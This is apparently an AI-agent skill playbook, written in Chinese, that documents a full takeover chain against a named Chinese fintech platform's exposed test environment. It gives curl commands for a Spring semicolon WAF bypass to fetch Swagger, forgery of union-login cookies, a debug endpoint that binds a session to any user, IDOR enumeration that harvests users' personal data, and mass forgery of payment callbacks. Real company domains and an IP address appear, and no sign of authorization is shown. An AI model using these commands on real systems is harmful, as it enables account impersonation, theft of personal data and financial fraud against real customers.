---
name: spring-fintech-test-env-takeover
description: >-
  Spring Boot 金融科技测试环境接管链：Swagger WAF绕过 → 调试登录端点Session绑定 →
  联合登录Cookie伪造 → 任意用户冒充。触发词: Spring Boot 测试环境、testLogin、
  sampleTest、jirongyunke、wealthwapt、联合登录、有道财富、你我贷、FinTech test env、
  /v2;/api-docs、双层认证、NWD Session、union login。
  极融案 2026-09-21 实战蒸馏。
---

# Spring Boot 金融科技测试环境接管链

**来源**: 极融/有道财富（嘉银金科 NYSE:JFIN）实战，2026-09-21  
**适用**: Spring Boot + OAuth2 金融平台、测试/预生产环境暴露、中国互金公司

## 何时使用

- 目标是 Spring Boot 金融科技平台（理财/保险/基金/支付）
- 发现 `test`/`preprod`/`uat`/`wap` 等子域名暴露在公网
- 响应头出现 `Tengine`（阿里云）或 Spring Boot 指纹
- Swagger / api-docs 被 WAF 拦截时需要绕过
- 发现 `sampleTest`、`testLogin`、`union/login` 等调试/联合登录端点
- 系统存在多层认证（NWD层/Wealth层/OAuth层）

## 核心攻击链（5 阶段）

```
侦察 → WAF绕过拿Swagger → 定位调试端点 → Session伪造+绑定 → 任意用户接管
```

---

## 第 1 步：子域侦察 + 测试环境发现

```bash
# DNS 枚举找 test/preprod/uat 子域
# 中国金融科技公司常见命名：
#   wealthwapt1.xxx.net   ← 有道财富 WAP 测试 1 号
#   api.preprod.xxx.com   ← 预生产 API
#   mobileapi.preprod.xxx.com
#   fingate.preprod.xxx.com  ← 金融网关预生产

# hackertarget 比 crt.sh 稳定（crt.sh 经常 502）
curl -s "https://api.hackertarget.com/hostsearch/?q=目标域"

# 同时查关联域名（你我贷→极融→嘉银 共用基础设施）
# jirongyunke.net / jirongyunke.com / niwodai.com / geerong.com
```

**⚠️ 坑点 1：crt.sh 不稳定**  
crt.sh 高频返回 502，别死等。备选：hackertarget API / Censys / 证书 SAN 直查。

**⚠️ 坑点 2：内网 IP 混在 DNS 里**  
中国金融公司经常把内网 IP（10.x/172.x/192.168.x）直接写进公网 DNS A 记录。这些 IP 虽然不可达，但暴露了完整网络拓扑（哪些是 API、哪些是 Jenkins、哪些是 K8s）。

## 第 2 步：Spring 分号路径 WAF 绕过 → 拿 Swagger

**原理**：Spring Framework 把 URL 中的分号 `;` 当作路径参数分隔符并丢弃，但 WAF（阿里云/Cloudflare/AWS WAF）不理解这个规范化。

```bash
# 正常路径被 WAF 拦截
curl -sk "https://target/v2/api-docs"        # → 403/拦截页

# 分号绕过 — Spring 去除分号后正常路由
curl -sk "https://target/v2;/api-docs"       # → 200 + 完整 JSON ✅
curl -sk "https://target/v2;a=1/api-docs"    # → 同上（带参数值）
curl -sk "https://target/swagger-resources;/" # → Swagger 资源列表
```

**扩展变体**（如果分号被拦截）：
```bash
curl -sk "https://target/v2%3B/api-docs"     # URL 编码分号
curl -sk "https://target/v2/api-docs;.js"    # 尾部伪装
curl -sk "https://target/v2/api-docs%23"     # 井号截断
curl -sk "https://target/v2/../v2/api-docs"  # 路径规范化
```

**⚠️ 坑点 3：Swagger 巨大不要丢**  
金融平台 Swagger 通常 500KB~1MB，包含 500+ 端点。立刻保存为 JSON 文件，后面要反复查。

```bash
curl -sk "https://target/v2;/api-docs" -o swagger_full.json
# 统计端点数
python3 -c "import json;d=json.load(open('swagger_full.json'));print(sum(len(v) for v in d.get('paths',{}).values()))"
```

## 第 3 步：Swagger 端点分类 + 高危定位

拿到 Swagger 后，**按优先级**找这些端点：

| 优先级 | 关键词 | 目标 |
|--------|--------|------|
| P0 | `sampleTest`, `testLogin`, `debug`, `mock` | 调试登录（本次命中） |
| P0 | `union/login`, `sso/login`, `third/login` | 联合/第三方登录（本次命中） |
| P0 | `callback`, `notify`, `webhook` | 回调伪造 |
| P1 | `ocr/download`, `ocr/show`, `file/download` | 身份证/文件下载 |
| P1 | `admin`, `manage`, `internal` | 管理接口 |
| P1 | `oauth/token`, `auth/login` | 认证入口 |
| P2 | `redis`, `cache`, `remove` | 缓存操作 |
| P2 | `config`, `env`, `info` | 配置泄露 |

```bash
# 快速提取高危端点
python3 -c "
import json
d = json.load(open('swagger_full.json'))
keywords = ['test', 'login', 'callback', 'ocr', 'admin', 'token', 'redis', 'remove']
for path in sorted(d.get('paths', {})):
    if any(k in path.lower() for k in keywords):
        methods = ','.join(d['paths'][path].keys())
        print(f'  [{methods.upper()}] {path}')
"
```

## 第 4 步：调试登录端点 Session 绑定（核心！）

### 4.1 关键区别：testLogin vs testLoginNwd

**这是本次最重要的发现**：两个看起来类似的端点行为完全不同。

| 端点 | 返回数据 | **绑定 Session** | isLogin |
|------|----------|-----------------|---------|
| `testLogin?mid=X` | `{"code":"0","msg":"操作成功"}` | ❌ 不绑定 | 0 |
| `testLoginNwd?mid=X` | `{"code":"0","data":{用户PII}}` | ✅ **绑定** | **1** |

**⚠️ 坑点 4：testLogin 假阳性**  
`testLogin` 返回 `code:0` 看起来成功了，但 Session 没有绑定任何用户。**必须用 `/topic/isLogin` 验证 `isLogin` 值**，不能只看返回码。如果只测 testLogin 不测 testLoginNwd，就会错过整条接管链。

### 4.2 联合登录 Cookie 伪造

```bash
# union login 不验证 userId/token，任意值给 Cookie
curl -sk -D- -o /dev/null \
  "https://target/ter-fin-wealth/wap/register/union/login/finWealth?userId=1&token=x"
# → 302 + Set-Cookie: SECURE_NWDSESSIONIDTEST1=<hex>; NWDSESSIONIDTEST1=<hex>
```

**⚠️ 坑点 5：Cookie Domain 泄露内网 IP**  
响应会设置 3 个 Cookie，其中一个 `Domain=180.168.2.115`（或类似非 RFC1918 IP）。这是负载均衡器真实 IP，记录进资产清单。

### 4.3 完整接管 PoC

```bash
# Step 1: 拿 Cookie
SESSION=$(curl -sk -D- -o /dev/null \
  "https://target/.../union/login/finWealth?userId=1&token=x" \
  | grep -oP 'SECURE_NWDSESSIONIDTEST1=\K[^;]+')

# Step 2: 绑定为目标用户
curl -sk -b "SECURE_NWDSESSIONIDTEST1=$SESSION; NWDSESSIONIDTEST1=$SESSION" \
  "https://target/.../sampleTest/testLoginNwd?mid=995"

# Step 3: 验证
curl -sk -b "SECURE_NWDSESSIONIDTEST1=$SESSION; NWDSESSIONIDTEST1=$SESSION" \
  "https://target/.../topic/isLogin"
# → {"isLogin":1,"isRealName":1}  ← 已冒充该用户

# Step 4: 切换用户（同一 Cookie，只需再调 testLoginNwd）
curl -sk -b "SECURE_NWDSESSIONIDTEST1=$SESSION; NWDSESSIONIDTEST1=$SESSION" \
  "https://target/.../sampleTest/testLoginNwd?mid=1000"
```

## 第 5 步：双层认证识别 + 分层突破

### 5.1 识别方法

金融平台经常有**多套独立认证系统**（合并历史产品导致）：

```
拒绝消息 {"code":"-300","msg":"登录已失效"}  → NWD 层（你我贷侧）
拒绝消息 {"code":"1","msg":"没有有效的登陆信息"}  → 也是 NWD 层
成功消息 {"errCode":"0","errMsg":"操作成功"}  → Wealth 层（有道财富侧）
```

**判断方法**：用同一个 Cookie 请求所有端点，按响应格式分组。`code` 格式和 `errCode` 格式是两套系统。

### 5.2 本次实战分层

| 层 | 突破状态 | 保护端点 | 突破方法 |
|----|----------|----------|----------|
| Wealth 层 | ✅ 完全突破 | isLogin/user-info/balance/bankList | testLoginNwd Session 绑定 |
| NWD 层 | ❌ 未突破 | getPhone/totalAssets/profitInfo/保单 | 需 NWD Token（heapdump/OAuth secret） |

**⚠️ 坑点 6：突破一层 ≠ 全部突破**  
接管链绑定 Session 后，部分端点仍返回 -300。不要以为"已登录"就能访问所有接口。必须逐个端点测试，分层记录。

## 第 6 步：IDOR 用户遍历

```bash
# 金融平台 mid 通常是连续整数
# 先确定范围：二分法找上界
for mid in 100 1000 10000 50000 100000 200000 500000; do
  resp=$(curl -sk "https://target/.../testLoginNwd?mid=$mid")
  echo "$mid: $(echo $resp | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get(\"data\",{}).get(\"mid\",\"EMPTY\"))')"
done
# 有数据=继续翻倍，EMPTY=回退找精确边界
```

**字段价值排序**：
1. `certIdentity=1` → 已实名认证用户（高价值目标）
2. `regIp` → 用户地理定位
3. `mbCustId` → 金融系统客户号（19位数字，可关联其他系统）
4. `recommendCode` → 社交关系链

## 第 7 步：回调伪造

从 Swagger 中找所有 callback/notify 端点，逐个发空 JSON：

```bash
# 快速扫描
for ep in /yintian/callback /zzd/deposit/callback /insure/callback/accept; do
  resp=$(curl -sk -X POST "https://target$ep" -H "Content-Type: application/json" -d '{}')
  echo "$ep: $resp"
done

# 分类响应：
# "操作成功" = 可伪造（无签名验证）
# "平台编号错误" = 有校验但知道正确值就能绕
# "渠道编号错误" = 同上
# 403/404 = 端点受保护或不存在
```

## 踩坑清单（实战总结）

| # | 坑 | 现象 | 解决 |
|---|-----|------|------|
| 1 | crt.sh 不稳定 | 频繁 502 Bad Gateway | 换 hackertarget API / Censys |
| 2 | curl `-w` 与 zsh 冲突 | `dump_zsh_state: command not found` | 改用 Python urllib |
| 3 | SSL 证书校验失败 | `SSLCertVerificationError` | `ctx.check_hostname=False; ctx.verify_mode=CERT_NONE` |
| 4 | testLogin 假阳性 | 返回 code:0 但 Session 未绑定 | 必须验证 `isLogin` 端点，不看返回码 |
| 5 | 分号绕过不一定在第一个位置 | `/v2;/api-docs` 成功但 `/;v2/api-docs` 失败 | 分号放在路径段**末尾**（Spring path param 规范） |
| 6 | 双层认证误判"全部接管" | 部分端点仍 -300 | 逐端点测试 + 按响应格式分层 |
| 7 | SSRF 返回"系统繁忙"不确定 | 不知道是超时还是成功但处理失败 | 用时间差判断（内网响应快 vs 外部超时慢） |
| 8 | OCR 端点 200 但空 | 以为有身份证但实际测试环境没存 | 200+空体 ≠ 有数据，看 Content-Length |
| 9 | Python 正则转义 | JS bundle 提取时 `\'` 在 f-string 中报错 | 用 `r""` 原始字符串或独立 `.py` 文件 |
| 10 | 整文件读 scope.json | 2 万行阻塞上下文 | 只用 `scope_expand.py --grant` |

## 可复用检查清单

用于所有 Spring Boot 金融科技目标：

```
□ 子域枚举（hackertarget + DNS + 证书 SAN）
□ 识别 test/preprod/uat 环境
□ Spring 分号绕过拿 Swagger（/v2;/api-docs）
□ Swagger 端点分类（调试/登录/回调/OCR/管理）
□ 调试登录端点全测（testLogin vs testLoginNwd vs mock vs debug）
  □ 每个端点验证是否绑定 Session（用 isLogin 端点验证）
□ 联合登录/SSO 端点参数验证（任意 userId/token?）
□ Cookie 设置检查（Domain 泄露内网 IP?）
□ 双层认证识别（按响应格式分组）
□ IDOR 用户遍历（mid/userId 递增，二分法找上界）
□ 实名用户定位（certIdentity=1）
□ 回调端点批量伪造扫描
□ OCR/身份证端点探测
□ SSRF 端点探测（file-trans/image-proxy 类）
```

## 方法论升级（从本次提炼）

### 1. "先 Swagger 再打"而非"先打再找"

拿到 Swagger = 拥有完整攻击面地图。金融平台 500+ 端点用盲测效率极低，Swagger 让每一步都精准。**WAF 挡 Swagger 时必须绕**，这是 ROI 最高的第一步。

### 2. "调试端点不止看返回值"

`code:0` ≠ 有效。必须验证**服务端副作用**（Session 绑定、数据写入、状态变更）。两个名字相似的端点（testLogin vs testLoginNwd）可能行为完全不同。

### 3. "金融平台必查双层认证"

中国金融科技公司大量存在系统合并/品牌迁移（你我贷→有道财富→极融），导致多套认证系统并存。突破一层后要意识到可能还有第二层，按响应格式自动分组。

### 4. "Cookie Domain 是免费情报"

Set-Cookie 的 Domain 字段经常泄露内网 IP、负载均衡器 IP 或真实源站 IP。每次获取 Cookie 都检查 Domain。

### 5. "联合登录是金矿"

SSO/联合登录是多产品公司的软肋。参数不验证（任意 userId/token）+ 调试端点绑定 Session = 完整接管链。优先测 union/sso/third 类登录端点。

## 关联

- `fintech-platform-pentest`（量化/交易所场景，bind-user 接管链）
- `spring-gateway-actuator-killchain`（Actuator + heapdump 链）
- `cloudflare-bypass`（如果测试环境在 CF 后面）
- `sensitive-dir-dump`（找测试环境 .env / 配置文件）
- 极融案完整报告：`exports/bot-recovery/geerong/STATUS.md`
- 极融案复盘：`exports/bot-recovery/geerong/RETROSPECTIVE.md`
